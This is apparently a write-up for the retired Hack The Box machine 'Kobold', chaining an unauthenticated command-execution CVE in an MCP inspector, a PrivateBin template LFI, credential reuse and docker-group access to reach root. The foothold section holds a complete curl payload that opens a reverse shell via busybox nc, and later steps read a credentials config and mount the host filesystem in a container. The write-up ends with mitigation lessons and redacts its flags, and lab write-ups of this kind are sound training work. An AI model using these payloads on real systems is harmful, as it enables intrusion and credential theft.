---
machine: Kobold
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mcp, cve-2026-23744, privatebin, docker, container-escape]
---

# Kobold — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Three modern services: **MCPJam Inspector** (an MCP server viewer), a **PrivateBin** and a Docker panel (**Arcane**). The inspector carries **CVE-2026-23744**: `/api/mcp/connect` passes the `command` field to `child_process.spawn()` with no authentication, so one JSON body gives a shell as `ben`. From there, the `operator` group can write into a directory PrivateBin mounts, and its template LFI (**CVE-2025-64714**) executes the PHP; the `conf.php` credentials open Arcane as admin, and a privileged container with `/` mounted finishes the box.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.kobold.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp    ssh
80/tcp    http   (vhosts)
3552/tcp  http   Arcane (Docker management)
```

```text
mcp.kobold.htb    -> MCPJam Inspector
bin.kobold.htb    -> PrivateBin
```

## Foothold: CVE-2026-23744

```bash
curl -s -X POST http://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{
  "name": "pwn",
  "command": "busybox",
  "args": ["sh", "-c", "busybox nc <IP> 4444 -e /bin/sh"]
}
JSON
```

```bash
nc -lvnp 4444
```

```text
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

## Group enumeration

```bash
id
grep -E "ben|operator|docker" /etc/group
```

```text
operator:x:1001:ben
docker:x:998:ben
```

Two paths depending on what the spawned session activates; supplementary groups are not always loaded in a fresh shell.

## Escalation I: PrivateBin and Arcane

```bash
ls -ld /opt/privatebin/data /opt/privatebin/tpl
# writable by the operator group
```

Drop a `.php` in the mounted directory and invoke it as a template:

```bash
curl -s "http://bin.kobold.htb/?tpl=../../data/<file>" -o /dev/null
```

The template LFI (CVE-2025-64714) includes the file and runs the code. With the shell, read the config:

```bash
cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
```

Those credentials work on **Arcane** (`:3552`) as administrator.

## Escalation II: privileged container

```bash
newgrp docker        # if the group exists but is not active
docker run -v /:/host --rm -it alpine chroot /host bash
```

```text
root@kobold:/# cat /root/root.txt
```

In Arcane the equivalent is creating a privileged container with the host volume mounted and entering it.

## Evidence (redacted)

```text
/home/ben/user.txt  -> <user_flag>
/root/root.txt      -> <root_flag>
```

## Lessons

- AI development tooling (MCP, viewers, agents) assumes a "trusted local environment"; exposed to the network it is unauthenticated RCE.
- `spawn(user_command)` without an allowlist is execution by design.
- Belonging to `docker` (or to a group that can write where another service mounts) equals root.
- Mitigation: authentication and an allowlist in the inspector, never expose it, minimal groups, and PrivateBin with fixed templates plus `open_basedir`.
